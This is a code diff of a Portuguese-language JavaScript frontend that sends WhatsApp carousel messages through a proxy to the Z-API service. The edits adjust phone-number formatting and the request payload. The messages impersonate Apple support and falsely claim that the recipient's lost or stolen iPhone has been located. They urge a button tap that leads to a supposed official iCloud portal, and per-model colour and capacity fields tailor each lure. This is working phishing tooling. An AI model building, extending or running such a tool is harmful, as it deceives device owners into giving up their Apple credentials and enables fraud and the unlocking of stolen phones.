@@ -1,8 +1,8 @@
 // ATENÇÃO: Esta URL precisa ser a URL REAL do seu proxy hospedado no Render.com.
 // SUBSTITUA 'URL_DO_SEU_PROXY_HOSPEDADO_AQUI' pela URL que o Render te deu (ex: 'https://painel-whatsapp-proxy-api.onrender.com')
 // No seu script.js do frontend:
-const proxyBaseUrl = window.location.origin; 
-const proxyCarouselUrl = `${proxyBaseUrl}/send-carousel-message`;
+const proxyBaseUrl = window.location.origin; // O mais indicado para um único Web Service
+const proxyCarouselUrl = `${proxyBaseUrl}/send-carousel-message`; // URL do seu endpoint no proxy
 
 const countriesDDI = [
     { name: "Afeganistão", code: "93" }, { name: "Argélia", code: "213" },
@@ -59,8 +59,6 @@ const countriesDDI = [
     { name: "Zâmbia", code: "260" }, { name: "Zimbábue", code: "263" }
 ];
 
-// As listas globais de cores e capacidades não são mais usadas para preencher dinamicamente os selects.
-// Elas são mantidas aqui caso precise delas para outras validações ou informações gerais.
 const coresIphoneGlobal = [
     "Silver", "Space Gray", "Gold", "Rose Gold", "(PRODUCT)RED",
     "White", "Black", "Blue", "Green", "Yellow", "Coral", "Purple",
@@ -74,12 +72,8 @@ const capacidadesIphoneGlobal = [
     "16 GB", "32 GB", "64 GB", "128 GB", "256 GB", "512 GB", "1 TB", "2 TB"
 ];
 
-// ************************************************
-// DEFINIÇÕES DE MENSAGENS COM ASTERISCOS CORRIGIDOS
-// ************************************************
-
+// --- DEFINIÇÕES DE MENSAGENS COM ASTERISCOS CORRIGIDOS ---
 const generalCarouselMessageTemplate = "*🍏 Assistente Virtual Apple – Suporte ao Cliente*";
-
 const defaultCardTemplateText = `*🔔 ALERTA DE LOCALIZAÇÃO: Dispositivo Encontrado*
 
 Detectamos a localização do seu *[MODELO_COMPLETO]*, marcado como Perdido/Roubado.
@@ -89,13 +83,6 @@ Detectamos a localização do seu *[MODELO_COMPLETO]*, marcado como Perdido/Roub
 👇 Toque no *botão* abaixo para continuar com a verificação:
 (Você será redirecionado ao portal oficial iCloud)`;
 
-// ************************************************
-// FIM DAS DEFINIÇÕES DE MENSAGENS
-// ************************************************
-
-
-// ATENÇÃO: carouselTemplates foi expandido para incluir capacidades e cores por sub-modelo.
-// As capacidades são baseadas em informações comuns para cada série/modelo.
 const carouselTemplates = [
     {
         id: "iphone_6_series_template",
@@ -324,6 +311,7 @@ function updateCapacityAndColorSelects(cardId) {
 
             // Tenta pré-selecionar a primeira opção disponível para capacidade e cor
             // Se já houver um valor selecionado, mantém, senão seleciona o primeiro.
+            // É importante fazer isso APÓS popular o select.
             if (capacitySelect.options.length > 1 && !capacitySelect.value) {
                 capacitySelect.value = capacitySelect.options[1].value;
             }
@@ -472,7 +460,7 @@ function addCarouselCard(cardData = null) {
 
             <div>
                 <label for="card-text-${currentCardId}" class="block text-sm font-medium text-lime-400 mb-1">Texto do Cartão (Editável):</label>
-                <textarea id="card-text-${currentCardId}" rows="10" placeholder="O texto final do seu cartão será gerado aqui. Você pode ajustar."
+                <textarea id="card-text-${currentCardId}" rows="15" placeholder="O texto final do seu cartão será gerado aqui. Você pode ajustar."
                                  class="w-full px-4 py-2 border border-gray-600 rounded-lg bg-gray-700 text-white focus:ring-lime-400 focus:border-lime-400 transition duration-150 ease-in-out shadow-sm"></textarea>
             </div>
 
@@ -650,13 +638,20 @@ async function enviarCarrossel() {
     
     const selectedDDI = document.getElementById('countryDDI').value;
     const rawNumero = document.getElementById('numero').value.trim();
-    const numeroCompleto = selectedDDI + rawNumero; 
+    let numeroCompleto = selectedDDI + rawNumero; // Concatena DDI e número
 
-    const mensagemGeral = document.getElementById('mensagemGeral').value.trim();
-    const delayMessage = document.getElementById('delayMessage').value.trim();
+    // ADIÇÃO CRÍTICA: REMOVER QUALQUER '+' INICIAL DO NÚMERO COMPLETO
+    numeroCompleto = numeroCompleto.replace(/^\+/, ''); 
 
-    if (!rawNumero || !selectedDDI || !mensagemGeral) {
-        log.innerText = '❌ Por favor, preencha o DDI do país, o número do cliente e a mensagem geral.';
+    // O frontend não precisa enviar 'mensagemGeral' ou 'delayMessage' para o proxy
+    // se o proxy já não as usa para o endpoint de carrossel da Z-API.
+    // O backend já tem a responsabilidade de montar o payload exato para a Z-API.
+    // Removendo-os daqui, evitamos enviar dados desnecessários.
+    // const mensagemGeral = document.getElementById('mensagemGeral').value.trim();
+    // const delayMessage = document.getElementById('delayMessage').value.trim();
+
+    if (!rawNumero || !selectedDDI) { // A validação de mensagemGeral pode ser removida se ela não for enviada
+        log.innerText = '❌ Por favor, preencha o DDI do país e o número do cliente.';
         return;
     }
 
@@ -724,24 +719,23 @@ async function enviarCarrossel() {
         });
     }
 
-    const payload = {
+    // O payload enviado do frontend para o PROXY (seu server.js)
+    // Agora ele só inclui o 'phone' e o 'carousel' (seus cartões).
+    // O 'server.js' faz o remapeamento para 'elements' e adiciona tokens na URL.
+    const payloadToProxy = {
         phone: numeroCompleto,
-        message: mensagemGeral,
-        carousel: carouselCards,
+        carousel: carouselCards // 'carouselCards' é o array de cartões do frontend
     };
-
-    if (delayMessage) {
-        payload.delayMessage = parseInt(delayMessage);
-    }
 
     try {
         log.innerText = 'Enviando carrossel...';
+        // A requisição é enviada para o seu próprio proxy (proxyCarouselUrl)
         const response = await fetch(proxyCarouselUrl, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
-            body: JSON.stringify(payload)
+            body: JSON.stringify(payloadToProxy) // Envia o payload simplificado para o proxy
         });
 
         const data = await response.json();
